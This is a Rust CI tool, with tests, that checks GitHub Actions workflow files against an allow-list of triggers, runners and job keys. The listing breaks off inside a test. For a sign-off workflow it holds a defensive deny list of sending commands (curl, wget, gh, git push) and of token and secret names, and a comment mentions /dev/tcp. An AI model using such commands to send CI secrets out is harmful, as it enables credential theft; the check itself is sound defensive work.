// SPDX-License-Identifier: AGPL-3.0-or-later
//! `actions-check`: GitHub Actions runs a release on a tag, `just lint` on a pull request, and
//! nothing else.
//!
//! ## Why this exists
//!
//! A workflow that ran on every push to `main`, with a macOS runner billed at ten Linux
//! minutes a minute, once made hundreds of failing runs and spent a month's Actions minutes
//! before it was switched off. The cause was two lines nobody read as a cost, and nothing read
//! `.github/workflows/` at all.
//!
//! ## An allow-list, over a real parse
//!
//! The first version of this was a line scanner that looked for the *bad* forms, and the
//! assessor planted six workflows it passed — `on: {push: {branches: [main]}}`, a quoted
//! `"runs-on":`, `runs-on : macos-latest`, a job inside a flow mapping, a reusable-workflow job
//! with no `runs-on` at all — and four triggers (`schedule`, `create`, `merge_group`,
//! `workflow_run`) it never named. A deny-list over YAML fails open twice: once for every form
//! the scanner does not read, and once for every trigger nobody thought to list.
//!
//! So each file is parsed with `yaml-rust2`, and **admitted only if every part of it is named
//! below**; anything else is refused with the file and the key. What is admitted:
//!
//! - **one YAML document**, a mapping whose keys are among [`TOP_KEYS`], with `on` and `jobs`;
//! - **`on`**: a mapping whose keys are `push` and, optionally, `workflow_dispatch`. `push` is a
//!   mapping whose **only** key is `tags`, a non-empty list of strings (or one string).
//!   `workflow_dispatch`, if present, is empty — no `inputs`, which would let a dispatch
//!   choose what runs. No other trigger, in any spelling — **except in [`LINT`], by name**,
//!   whose `on` is a mapping whose only key is `pull_request`, empty: the fast gate on every
//!   pull request, and nothing else. Any other file with `pull_request` is refused, and so is
//!   [`LINT`] with any trigger beside it or any filter on it. [`SIGNOFF`] is the second file
//!   admitted on `pull_request`, by name, on the same terms: the sign-off check every
//!   repository is born with, and it may do less than [`LINT`] (below);
//! - **`jobs`**: a non-empty mapping; each job a mapping whose keys are among [`JOB_KEYS`],
//!   with `runs-on` **exactly one of [`RUNNERS`]** — the standard GitHub-hosted Linux labels,
//!   so no list, no label group, no self-hosted runner and no larger runner
//!   (`ubuntu-latest-64-cores` is billed many times the standard minute). `runs-on` being one
//!   label does not stop a job multiplying: `strategy` is not among [`JOB_KEYS`], so a matrix
//!   is refused as a key, not as a runner. `container`, `services`, `environment` and
//!   `continue-on-error` are not among them either, nor are `name`, `if`, `concurrency`,
//!   `outputs` and `defaults`: the list is what the release workflow uses. **No job-level
//!   `uses:`**, since a reusable workflow brings its own runners and triggers from a file this
//!   does not read, and no `<<` merge key, which would bring keys this never saw.
//!
//! What the steps do is not this check's business: it holds *when* a workflow runs and *on
//! what*, which is what spends the budget. [`SIGNOFF`] is the one exception, because it runs
//! on every pull request, a fork's among them, and is admitted to read that pull request's
//! commits. What is held of it, and only this:
//!
//! - **its shape**: top-level keys `name`, `on` and `jobs` alone; one job, whose keys are
//!   `runs-on` and `steps`; exactly two steps, `actions/checkout` pinned to a full commit and
//!   then one `run`, each with at most a `name`;
//! - **the checkout keeps no credentials**: its `with` carries `persist-credentials: false`,
//!   and besides it at most `fetch-depth`;
//! - **what reaches the step from the event**: every `${{ … }}` expression anywhere in the
//!   file is `github.event.pull_request.base.sha` or `github.event.pull_request.head.sha`,
//!   two commit ids, and nothing a pull request's author writes (its title, its branch's name,
//!   an input) is interpolated into the script;
//! - **what the step names**: its `run` text names none of `curl`, `wget`, `gh` or
//!   `git push`, as words, and the file names no `secrets`, `github.token` or `GITHUB_TOKEN`.
//!
//! What it does not hold: what the script computes from the commits, or a sending command it
//! does not name (a shell's own `/dev/tcp`, an interpreter). Those are read by the reviewer of
//! a change to the file; this keeps the plain ways out of it, and keeps the file from growing
//! into a second gate with its own reach.
//!
//! Enforcing: it is green on the tree it lands on, so it blocks nobody, and the failure it
//! closes cost a month's budget.

use std::path::Path;

use yaml_rust2::{Yaml, YamlLoader};

/// Where GitHub reads workflows from. Only the top level; GitHub reads nothing below it.
const DIR: &str = ".github/workflows";

/// The one workflow admitted on `pull_request`, by file name: `just lint` on every pull
/// request. Named rather than recognised by what it runs, because what its steps do is not
/// this check's business and a name cannot drift into a second one.
const LINT: &str = "lint.yml";

/// The second workflow admitted on `pull_request`, by file name: every commit a pull request
/// brings is signed off by its author and none is made as an agent. Every repository takes it
/// at its first commit; its steps are held to [`signoff_shape`].
const SIGNOFF: &str = "signoff.yml";

/// The one action [`SIGNOFF`] may use, pinned to a full commit.
const CHECKOUT: &str = "actions/checkout@";

/// The only `${{ … }}` expressions [`SIGNOFF`] may hold: the two commit ids its range is.
const SIGNOFF_EXPRESSIONS: &[&str] = &[
    "github.event.pull_request.base.sha",
    "github.event.pull_request.head.sha",
];

/// Commands [`SIGNOFF`]'s step may not name: it reads commits, and sends nothing.
const SIGNOFF_SENDERS: &[&str] = &["curl", "wget", "gh"];

/// Every `${{ … }}` expression in `text`, trimmed, or `Err` at one left open.
fn expressions(text: &str) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    let mut rest = text;
    while let Some(i) = rest.find("${{") {
        let after = &rest[i + 3..];
        let Some(j) = after.find("}}") else {
            return Err("an `${{` with no `}}` after it".into());
        };
        out.push(after[..j].trim().to_string());
        rest = &after[j + 2..];
    }
    Ok(out)
}

/// The words of a shell text: runs of letters, digits and `_ . -`, so `$(curl` and `;curl`
/// are the word `curl` and `github.event` is not `gh`.
fn words(text: &str) -> Vec<&str> {
    text.split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-')))
        .filter(|w| !w.is_empty())
        .collect()
}

/// Top-level keys a workflow may carry. Anything else — including a YAML merge key `<<`,
/// which the parser leaves unresolved — is refused rather than guessed at.
const TOP_KEYS: &[&str] = &[
    "name",
    "run-name",
    "on",
    "permissions",
    "env",
    "defaults",
    "concurrency",
    "jobs",
];

/// Job-level keys a job may carry: exactly the ones `.github/workflows/release.yml` uses, and no
/// more. A future workflow that needs another adds it here with its reason. `uses` (a reusable
/// workflow) and `<<` (a merge key the parser leaves unresolved) are absent on purpose. So are
/// `strategy` (a matrix multiplies a job into as many billed ones as it lists), `container`,
/// `services`, `environment`, `continue-on-error`, and `name`, `if`, `concurrency`, `outputs`
/// and `defaults` (`defaults.run` changes the shell and directory of every step).
const JOB_KEYS: &[&str] = &[
    "needs",
    "runs-on",
    "permissions",
    "env",
    "steps",
    "timeout-minutes",
];

/// The runner labels admitted: the standard GitHub-hosted Linux runners, and no larger one.
const RUNNERS: &[&str] = &["ubuntu-latest", "ubuntu-24.04", "ubuntu-22.04"];

fn key(k: &Yaml) -> String {
    match k {
        Yaml::String(s) => s.clone(),
        other => format!("{other:?}"),
    }
}

/// Every refusal for one workflow file, named `file`, each naming the key it is about.
pub(crate) fn refusals(file: &str, text: &str) -> Vec<String> {
    let docs = match YamlLoader::load_from_str(text) {
        Ok(d) => d,
        Err(e) => return vec![format!("not YAML this can read: {e}")],
    };
    let [doc] = docs.as_slice() else {
        return vec![format!(
            "{} YAML documents; a workflow is exactly one",
            docs.len()
        )];
    };
    let Yaml::Hash(top) = doc else {
        return vec!["the document is not a mapping".into()];
    };
    let mut out = Vec::new();
    for k in top.keys() {
        let k = key(k);
        if !TOP_KEYS.contains(&k.as_str()) {
            out.push(format!(
                "top-level key `{k}` is not one this admits ({})",
                TOP_KEYS.join(", ")
            ));
        }
    }
    match top.get(&Yaml::String("on".into())) {
        None => out.push("no `on:` — a workflow here runs on a pushed tag, and says so".into()),
        Some(on) if file == LINT || file == SIGNOFF => pull_request_trigger(&mut out, file, on),
        Some(on) => triggers(&mut out, on),
    }
    match top.get(&Yaml::String("jobs".into())) {
        None => out.push("no `jobs:`".into()),
        Some(jobs) => check_jobs(&mut out, jobs),
    }
    if file == SIGNOFF {
        signoff_shape(&mut out, top, text);
    }
    out
}

/// What [`SIGNOFF`] may do: read the pull request's commits, and nothing else.
fn signoff_shape(out: &mut Vec<String>, top: &yaml_rust2::yaml::Hash, text: &str) {
    for k in top.keys() {
        let k = key(k);
        if !["name", "on", "jobs"].contains(&k.as_str()) {
            out.push(format!("`{k}` in {SIGNOFF} — it carries `name`, `on` and `jobs` and nothing else"));
        }
    }
    for word in ["secrets", "github.token", "GITHUB_TOKEN"] {
        if text.contains(word) {
            out.push(format!("{SIGNOFF} names `{word}` — it reads commits and is handed no secret"));
        }
    }
    match expressions(text) {
        Err(why) => out.push(format!("{SIGNOFF} holds {why}")),
        Ok(found) => {
            for e in found {
                if !SIGNOFF_EXPRESSIONS.contains(&e.as_str()) {
                    out.push(format!(
                        "{SIGNOFF} interpolates `${{{{ {e} }}}}` — only {} reach its script, so nothing a pull request's author writes is run as code",
                        SIGNOFF_EXPRESSIONS.join(" and ")
                    ));
                }
            }
        }
    }
    let Some(Yaml::Hash(jobs)) = top.get(&Yaml::String("jobs".into())) else {
        return;
    };
    if jobs.len() != 1 {
        out.push(format!("{SIGNOFF} has {} jobs — it has one", jobs.len()));
    }
    for (name, job) in jobs {
        let name = key(name);
        let Yaml::Hash(job) = job else { continue };
        for k in job.keys() {
            let k = key(k);
            if !["runs-on", "steps"].contains(&k.as_str()) {
                out.push(format!("`jobs.{name}.{k}` in {SIGNOFF} — its job carries `runs-on` and `steps` and nothing else"));
            }
        }
        let steps = match job.get(&Yaml::String("steps".into())) {
            Some(Yaml::Array(steps)) => steps,
            _ => {
                out.push(format!("`jobs.{name}.steps` in {SIGNOFF} is not a list of steps"));
                continue;
            }
        };
        if steps.len() != 2 {
            out.push(format!(
                "`jobs.{name}.steps` in {SIGNOFF} has {} steps — it has two: the checkout, then one `run`",
                steps.len()
            ));
        }
        for (i, step) in steps.iter().enumerate() {
            let Yaml::Hash(step) = step else {
                out.push(format!("`jobs.{name}.steps[{i}]` in {SIGNOFF} is not a step"));
                continue;
            };
            let allowed: &[&str] = if i == 0 { &["name", "uses", "with"] } else { &["name", "run"] };
            for k in step.keys() {
                let k = key(k);
                if !allowed.contains(&k.as_str()) {
                    out.push(format!(
                        "`jobs.{name}.steps[{i}].{k}` in {SIGNOFF} — step {i} carries {} and nothing else",
                        allowed.join(", ")
                    ));
                }
            }
            if i == 0 {
                let pinned = match step.get(&Yaml::String("uses".into())) {
                    Some(Yaml::String(u)) => u
                        .strip_prefix(CHECKOUT)
                        .is_some_and(|sha| sha.len() == 40 && sha.bytes().all(|b| b.is_ascii_hexdigit())),
                    _ => false,
                };
                if !pinned {
                    out.push(format!(
                        "`jobs.{name}.steps[0].uses` in {SIGNOFF} is not `{CHECKOUT}<a full commit>` — the first step is the checkout, pinned"
                    ));
                }
                let with = match step.get(&Yaml::String("with".into())) {
                    Some(Yaml::Hash(with)) => Some(with),
                    _ => None,
                };
                let keeps_none = with.is_some_and(|w| {
                    matches!(w.get(&Yaml::String("persist-credentials".into())), Some(Yaml::Boolean(false)))
                });
                if !keeps_none {
                    out.push(format!(
                        "`jobs.{name}.steps[0].with.persist-credentials` in {SIGNOFF} is not `false` — the checkout keeps no credentials for the step after it"
                    ));
                }
                if let Some(with) = with {
                    for k in with.keys() {
                        let k = key(k);
                        if !["fetch-depth", "persist-credentials"].contains(&k.as_str()) {
                            out.push(format!(
                                "`jobs.{name}.steps[0].with.{k}` in {SIGNOFF} — the checkout takes `fetch-depth` and `persist-credentials` and nothing else"
                            ));
                        }
                    }
                }
            } else if let Some(Yaml::String(run)) = step.get(&Yaml::String("run".into())) {
                let w = words(run);
                for sender in SIGNOFF_SENDERS {
                    if w.contains(sender) {
                        out.push(format!(
                            "`jobs.{name}.steps[{i}].run` in {SIGNOFF} names `{sender}` — the step reads commits and sends nothing"
                        ));
                    }
                }
                if w.windows(2).any(|p| p == ["git", "push"]) {
                    out.push(format!(
                        "`jobs.{name}.steps[{i}].run` in {SIGNOFF} names `git push` — the step reads commits and sends nothing"
                    ));
                }
            } else {
                out.push(format!("`jobs.{name}.steps[{i}]` in {SIGNOFF} has no `run` — after the checkout it runs one shell step"));
            }
        }
    }
}

fn triggers(out: &mut Vec<String>, on: &Yaml) {
    let Yaml::Hash(on) = on else {
        out.push(format!(
            "`on` is {} — it must be a mapping of `push:` with `tags:` (and at most an empty `workflow_dispatch:`)",
            shape(on)
        ));
        return;
    };
    let mut push = false;
    for (k, v) in on {
        match key(k).as_str() {
            "push" => {
                push = true;
                push_is_tags_only(out, v);
            }
            "workflow_dispatch" => {
                let empty = matches!(v, Yaml::Null) || matches!(v, Yaml::Hash(h) if h.is_empty());
                if !empty {
                    out.push("`on.workflow_dispatch` carries settings — it is admitted only empty, with no `inputs`".into());
                }
            }
            other => out.push(format!(
                "`on.{other}` is a trigger this does not admit — Actions runs a release on a pushed tag and nothing else"
            )),
        }
    }
    if !push {
        out.push("`on` has no `push:` with `tags:`".into());
    }
}

/// [`LINT`]'s and [`SIGNOFF`]'s trigger: `pull_request`, empty, and nothing beside it.
fn pull_request_trigger(out: &mut Vec<String>, file: &str, on: &Yaml) {
    let Yaml::Hash(on) = on else {
        out.push(format!(
            "`on` is {} — {file} runs on a mapping of `pull_request:` and nothing else",
            shape(on)
        ));
        return;
    };
    let mut pr = false;
    for (k, v) in on {
        match key(k).as_str() {
            "pull_request" => {
                pr = true;
                let empty = matches!(v, Yaml::Null) || matches!(v, Yaml::Hash(h) if h.is_empty());
                if !empty {
                    out.push(format!(
                        "`on.pull_request` carries settings — in {file} it is admitted only empty, so every pull request runs the same gate"
                    ));
                }
            }
            other => out.push(format!(
                "`on.{other}` is a trigger {file} does not admit — it runs on `pull_request` and nothing else"
            )),
        }
    }
    if !pr {
        out.push(format!("`on` has no `pull_request:` — {file} runs on every pull request"));
    }
}

fn push_is_tags_only(out: &mut Vec<String>, push: &Yaml) {
    let Yaml::Hash(filters) = push else {
        out.push(format!(
            "`on.push` is {} — with no `tags:` filter it runs on every branch push",
            shape(push)
        ));
        return;
    };
    for (k, v) in filters {
        let k = key(k);
        if k != "tags" {
            out.push(format!("`on.push.{k}` — `push` is admitted with `tags:` and no other filter; `{k}` runs it on branch pushes"));
            continue;
        }
        let ok = match v {
            Yaml::String(s) => !s.is_empty(),
            Yaml::Array(a) => {
                !a.is_empty()
                    && a.iter()
                        .all(|t| matches!(t, Yaml::String(s) if !s.is_empty()))
            }
            _ => false,
        };
        if !ok {
            out.push(format!(
                "`on.push.tags` is {} — it must name at least one tag pattern",
                shape(v)
            ));
        }
    }
    if !filters.contains_key(&Yaml::String("tags".into())) {
        out.push("`on.push` has no `tags:` — it runs on branch pushes".into());
    }
}

fn check_jobs(out: &mut Vec<String>, jobs: &Yaml) {
    let Yaml::Hash(jobs) = jobs else {
        out.push(format!("`jobs` is {}, not a mapping of jobs", shape(jobs)));
        return;
    };
    if jobs.is_empty() {
        out.push("`jobs` is empty".into());
    }
    for (name, job) in jobs {
        let name = key(name);
        let Yaml::Hash(job) = job else {
            out.push(format!("`jobs.{name}` is {}, not a job", shape(job)));
            continue;
        };
        for k in job.keys() {
            let k = key(k);
            if k == "uses" {
                out.push(format!(
                    "`jobs.{name}.uses` — a reusable workflow brings runners and triggers from a file this does not read"
                ));
            } else if !JOB_KEYS.contains(&k.as_str()) {
                out.push(format!(
                    "`jobs.{name}.{k}` is not a job key this admits ({})",
                    JOB_KEYS.join(", ")
                ));
            }
        }
        match job.get(&Yaml::String("runs-on".into())) {
            Some(Yaml::String(label)) if is_linux(label) => {}
            Some(Yaml::String(label)) => out.push(format!(
                "`jobs.{name}.runs-on` is `{label}` — only a standard GitHub-hosted Linux label ({}) runs here",
                RUNNERS.join(", ")
            )),
            Some(other) => out.push(format!(
                "`jobs.{name}.runs-on` is {} — only a standard GitHub-hosted Linux label ({}) runs here",
                shape(other),
                RUNNERS.join(", ")
            )),
            None => out.push(format!("`jobs.{name}` has no `runs-on`")),
        }
    }
}

/// A standard GitHub-hosted Linux runner label, written plainly.
fn is_linux(label: &str) -> bool {
    RUNNERS.contains(&label)
}

fn shape(v: &Yaml) -> String {
    match v {
        Yaml::String(s) => format!("the string `{s}`"),
        Yaml::Array(_) => "a list".into(),
        Yaml::Hash(_) => "a mapping".into(),
        Yaml::Null => "empty".into(),
        Yaml::Boolean(b) => format!("`{b}`"),
        Yaml::Integer(i) => format!("`{i}`"),
        Yaml::Real(r) => format!("`{r}`"),
        Yaml::Alias(_) | Yaml::BadValue => "a value this cannot read".into(),
    }
}

/// Every refusal under `dir`, as `(file, refusal)`.
pub(crate) fn check_dir(dir: &Path) -> Vec<(String, String)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut files: Vec<_> = entries.filter_map(|e| e.ok()).map(|e| e.path()).collect();
    files.sort();
    let mut out = Vec::new();
    for p in files {
        let shown = p.display().to_string();
        if !p.is_file() {
            out.push((
                shown,
                "not a file — nothing but workflow files belongs here".into(),
            ));
            continue;
        }
        match p.extension().and_then(|e| e.to_str()) {
            Some("yml" | "yaml") => {}
            _ => {
                out.push((
                    shown,
                    "not a .yml or .yaml file — nothing but workflows belongs here".into(),
                ));
                continue;
            }
        }
        match std::fs::read_to_string(&p) {
            Ok(text) => {
                let name = p.file_name().and_then(|n| n.to_str()).unwrap_or_default();
                out.extend(refusals(name, &text).into_iter().map(|r| (shown.clone(), r)))
            }
            Err(e) => out.push((shown, format!("cannot read it: {e}"))),
        }
    }
    out
}

pub fn run(_args: &[String]) {
    let dir = Path::new(DIR);
    let found = check_dir(dir);
    if found.is_empty() {
        let n = std::fs::read_dir(dir).map(|d| d.count()).unwrap_or(0);
        println!(
            "actions-check: OK — {n} workflow file(s) under {DIR}, each admitted: triggered only by `push` \
             with `tags` (and at most an empty `workflow_dispatch`), or {LINT} or {SIGNOFF} by an empty \
             `pull_request` and nothing else ({SIGNOFF} only as a pinned checkout and one shell step), every job on a standard `ubuntu-` runner with only named job keys, so no \
             reusable-workflow job and no merge key."
        );
        return;
    }
    println!("actions-check: {} refusal(s)\n", found.len());
    for (file, why) in &found {
        println!("  {file}\n    {why}");
    }
    println!(
        "\nActions runs the release workflow on a tag and {LINT} and {SIGNOFF} on a pull request, \n\
         and nothing else. This admits a workflow only if every trigger, runner and job form is one it names."
    );
    std::process::exit(1);
}

#[cfg(test)]
mod tests {
    use super::*;

    const GOOD: &str = "on:\n  push:\n    tags:\n      - 'v*'\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n";

    fn planted(file: &str, text: &str) -> Vec<(String, String)> {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(file), text).unwrap();
        check_dir(dir.path())
    }

    fn refused(text: &str) {
        let got = planted("w.yml", text);
        assert!(!got.is_empty(), "admitted, and should not be:\n{text}");
    }

    /// The workflow the repository actually has is admitted, read from the tree; so are the
    /// other forms the allow-list names.
    #[test]
    fn the_release_workflow_passes() {
        let text = include_str!("../../.github/workflows/release.yml");
        assert_eq!(refusals("release.yml", text), Vec::<String>::new());
        for ok in [
            GOOD.to_string(),
            "on: {push: {tags: [v*]}}\njobs: {a: {runs-on: ubuntu-24.04}}\n".to_string(),
            "on:\n  push:\n    tags: v*\n  workflow_dispatch:\njobs:\n  a:\n    runs-on: ubuntu-latest\n".to_string(),
            format!("# on: pull_request\n{GOOD}"),
        ] {
            assert!(planted("ok.yml", &ok).is_empty(), "refused:\n{ok}\n{:?}", planted("ok.yml", &ok));
        }
    }

    /// **Planted: every form the assessor found the line scanner passed**, 2026-09-29, each
    /// refused now.
    #[test]
    fn the_forms_the_line_scanner_passed_are_refused() {
        for text in [
            "on: {push: {branches: [main]}}\njobs: {a: {runs-on: ubuntu-latest}}\n",
            "on: {pull_request: {}}\njobs: {a: {runs-on: ubuntu-latest}}\n",
            "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    \"runs-on\": macos-latest\n",
            "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on : macos-latest\n",
            "on:\n  push:\n    tags: [v*]\njobs: {a: {runs-on: macos-latest}}\n",
            "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    uses: org/repo/.github/workflows/x.yml@0123456789abcdef0123456789abcdef01234567\n",
        ] {
            refused(text);
        }
    }

    /// **Planted: a push on branches**, in every filter that runs one.
    #[test]
    fn a_branch_push_is_refused() {
        for on in [
            "on:\n  push:\n    branches: [main]\n",
            "on:\n  push:\n",
            "on: push\n",
            "on: [push]\n",
            "on:\n  push:\n    tags: [v*]\n    branches: [main]\n",
            "on:\n  push:\n    tags-ignore: [x]\n",
            "on:\n  push:\n    paths: [src/**]\n",
            "on:\n  push:\n    tags: []\n",
        ] {
            refused(&format!("{on}jobs:\n  a:\n    runs-on: ubuntu-latest\n"));
        }
    }

    /// **Planted: a pull_request trigger, and every other trigger** — the allow-list names two,
    /// so a trigger nobody thought to list is refused by construction.
    #[test]
    fn every_other_trigger_is_refused() {
        for t in [
            "pull_request:",
            "pull_request_target:",
            "schedule:\n    - cron: '0 0 * * *'",
            "create:",
            "merge_group:",
            "workflow_run:\n    workflows: [release]",
            "workflow_call:",
            "release:\n    types: [published]",
            "repository_dispatch:",
            "workflow_dispatch:\n    inputs:\n      target: {type: string}",
        ] {
            refused(&format!(
                "on:\n  push:\n    tags: [v*]\n  {t}\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
            ));
        }
    }

    /// **Planted: a runner that is not a plain Linux label.**
    #[test]
    fn a_runner_that_is_not_linux_is_refused() {
        for runs_on in [
            "macos-latest",
            "macos-14",
            "windows-latest",
            "self-hosted",
            "\"${{ matrix.os }}\"",
            "ubuntu-${{ matrix.v }}",
            "[self-hosted, linux]",
            "[ubuntu-latest]",
            "{group: big}",
            "ubuntu-latest-64-cores",
            "ubuntu-24.04-arm",
            "",
        ] {
            refused(&GOOD.replace("runs-on: ubuntu-latest", &format!("runs-on: {runs_on}")));
        }
        // One Linux job does not excuse a second that is not, and a job with no runner at all
        // is refused.
        assert_eq!(
            planted("w.yml", &format!("{GOOD}  b:\n    runs-on: macos-14\n")).len(),
            1
        );
        refused(&format!("{GOOD}  b:\n    steps: []\n"));
    }

    /// **Planted, 2026-09-29, by the second assessment**: a job that carries a runner does not
    /// thereby get its other keys admitted. Each of these has `runs-on: ubuntu-latest`, so
    /// the refusal is for the key and not for a missing runner.
    #[test]
    fn a_job_key_nobody_named_is_refused_even_beside_a_good_runner() {
        for text in [
            "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    uses: org/repo/.github/workflows/x.yml@0123456789abcdef0123456789abcdef01234567\n",
            "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    \"uses\": ./.github/workflows/x.yml\n",
            "env: &b\n  uses: ./x.yml\non:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    <<: *b\n",
            "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    runs_on: macos-14\n",
        ] {
            let got = planted("w.yml", text);
            assert!(
                !got.is_empty()
                    && got.iter().all(|(_, r)| r.starts_with("`jobs.a.uses`")
                        || r.contains("is not a job key")),
                "not refused for its job key:\n{text}\n{got:?}"
            );
        }
    }

    /// A matrix beside a good runner is fifty billed jobs per tag; `strategy` is not a job key
    /// this admits, and neither is any other key the release workflow never uses.
    #[test]
    fn a_matrix_beside_a_good_runner_is_refused() {
        let matrix = "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        n: [1, 2, 3]\n    steps:\n      - run: true\n";
        let got = planted("w.yml", matrix);
        assert!(
            got.iter()
                .any(|(_, r)| r.starts_with("`jobs.a.strategy`") && r.contains("is not a job key")),
            "a matrix was admitted:\n{got:?}"
        );
        for k in [
            "container",
            "services",
            "environment",
            "continue-on-error",
            "name",
            "if",
            "concurrency",
            "outputs",
            "defaults",
        ] {
            let text = format!(
                "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    {k}: x\n    steps:\n      - run: true\n"
            );
            let got = planted("w.yml", &text);
            let want = format!("`jobs.a.{k}`");
            assert!(
                got.iter()
                    .any(|(_, r)| r.starts_with(&want) && r.contains("is not a job key")),
                "`{k}` was not refused as a job key:\n{got:?}"
            );
        }
        // `defaults.run.shell` rewrites every step, which is why `defaults` is not admitted.
        let defaults = "on:\n  push:\n    tags: [v*]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash -e {0}\n    steps:\n      - run: true\n";
        assert!(!planted("w.yml", defaults).is_empty(), "job-level defaults admitted");
    }

    /// What it cannot read, or the allow-list does not name, is refused rather than passed.
    #[test]
    fn what_it_cannot_read_is_refused() {
        for text in [
            "\"on\": [push\n",                                   // not YAML
            "jobs:\n  a:\n    runs-on: ubuntu-latest\n",          // no on
            "on:\n  push:\n    tags: [v*]\n",                     // no jobs
            "on:\n  push:\n    tags: [v*]\njobs: {}\n",           // no job
            "- on\n",                                             // not a mapping
            &format!("{GOOD}---\n{GOOD}"),                        // two documents
            &format!("{GOOD}on:\n  pull_request:\n"),             // a duplicate key
            &format!("x: &p {{pull_request: {{}}}}\n{GOOD}"),       // an unknown top-level key
            "base: &b\n  runs-on: ubuntu-latest\non:\n  push:\n    tags: [v*]\njobs:\n  a:\n    <<: *b\n",
        ] {
            refused(text);
        }
        assert!(!planted("notes.md", "anything").is_empty());
    }

    const LINT_GOOD: &str = "on:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: just lint\n";

    /// **The lint workflow the repository has is admitted, by its name**, and so is the plain
    /// form of it.
    #[test]
    fn the_lint_workflow_passes_under_its_own_name() {
        let text = include_str!("../../.github/workflows/lint.yml");
        assert_eq!(refusals("lint.yml", text), Vec::<String>::new());
        assert!(planted("lint.yml", LINT_GOOD).is_empty(), "{:?}", planted("lint.yml", LINT_GOOD));
        let both = tempfile::tempdir().unwrap();
        std::fs::write(both.path().join("lint.yml"), LINT_GOOD).unwrap();
        std::fs::write(both.path().join("release.yml"), GOOD).unwrap();
        assert_eq!(check_dir(both.path()), Vec::<(String, String)>::new());
    }

    /// **Planted: a second pull_request workflow.** The trigger is admitted for `lint.yml` by
    /// name and for nothing else, whatever the other file runs.
    #[test]
    fn a_second_pull_request_workflow_is_refused() {
        for name in ["lint2.yml", "ci.yml", "lint.yaml", "Lint.yml", "test.yml"] {
            let got = planted(name, LINT_GOOD);
            assert!(
                got.iter().any(|(_, why)| why.contains("on.pull_request")),
                "{name} admitted on pull_request: {got:?}"
            );
        }
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("lint.yml"), LINT_GOOD).unwrap();
        std::fs::write(dir.path().join("test.yml"), LINT_GOOD).unwrap();
        let got = check_dir(dir.path());
        assert!(!got.is_empty(), "a second pull_request workflow beside lint.yml was admitted");
        assert!(got.iter().all(|(f, _)| f.ends_with("test.yml")), "lint.yml itself refused: {got:?}");
    }

    /// **Planted: `lint.yml` with anything but an empty `pull_request`** — a push, a second
    /// trigger, a filter, the target form, a matrix — each refused.
    #[test]
    fn lint_yml_runs_on_pull_request_and_nothing_else() {
        let job = "jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: just lint\n";
        for on in [
            "on:\n  push:\n    tags: [v*]\n",
            "on:\n  pull_request:\n  push:\n    branches: [main]\n",
            "on:\n  pull_request:\n  workflow_dispatch:\n",
            "on:\n  pull_request:\n    branches: [main]\n",
            "on:\n  pull_request:\n    types: [opened, synchronize]\n",
            "on:\n  pull_request_target:\n",
            "on: pull_request\n",
            "on: [pull_request]\n",
            "on:\n  schedule:\n    - cron: '0 0 * * *'\n",
        ] {
            let text = format!("{on}{job}");
            assert!(!planted("lint.yml", &text).is_empty(), "admitted:\n{text}");
        }
        let matrix = "on:\n  pull_request:\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        os: [a, b]\n";
        assert!(!planted("lint.yml", matrix).is_empty(), "a matrix admitted in lint.yml");
        let mac = "on:\n  pull_request:\njobs:\n  lint:\n    runs-on: macos-latest\n";
        assert!(!planted("lint.yml", mac).is_empty(), "a macOS runner admitted in lint.yml");
    }

    /// The sign-off workflow this repository carries.
    const SIGNOFF_TEXT: &str = include_str!("../../.github/workflows/signoff.yml");

    /// **The sign-off workflow is admitted, by its name and beside lint.yml**, and the same
    /// file under any other name is refused on its trigger.
    #[test]
    fn the_signoff_workflow_passes_under_its_own_name() {
        assert_eq!(refusals("signoff.yml", SIGNOFF_TEXT), Vec::<String>::new());
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("lint.yml"), LINT_GOOD).unwrap();
        std::fs::write(dir.path().join("release.yml"), GOOD).unwrap();
        std::fs::write(dir.path().join("signoff.yml"), SIGNOFF_TEXT).unwrap();
        assert_eq!(check_dir(dir.path()), Vec::<(String, String)>::new());
        for name in ["signoff.yaml", "sign-off.yml", "Signoff.yml", "dco.yml"] {
            let got = planted(name, SIGNOFF_TEXT);
            assert!(
                got.iter().any(|(_, why)| why.contains("on.pull_request")),
                "{name} admitted on pull_request: {got:?}"
            );
        }
    }

    /// **Planted: the sign-off workflow doing more than reading commits** — another action, a
    /// third step, an unpinned or floating checkout, a setting the checkout does not need, a
    /// secret or the token, an `env`, a second job, a key on its job, a filter or a second
    /// trigger — each refused, and each for a reason that names the file.
    #[test]
    fn the_signoff_workflow_may_only_check_out_and_run_one_step() {
        let pin = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262";
        let base = |steps: &str| {
            format!("name: signoff\non:\n  pull_request:\njobs:\n  signoff:\n    runs-on: ubuntu-24.04\n    steps:\n{steps}")
        };
        let checkout = format!("      - uses: {pin} # v4.4.0\n        with:\n          fetch-depth: 0\n          persist-credentials: false\n");
        let run = "      - name: every commit is signed off\n        run: |\n          echo ok\n";
        let good = base(&format!("{checkout}{run}"));
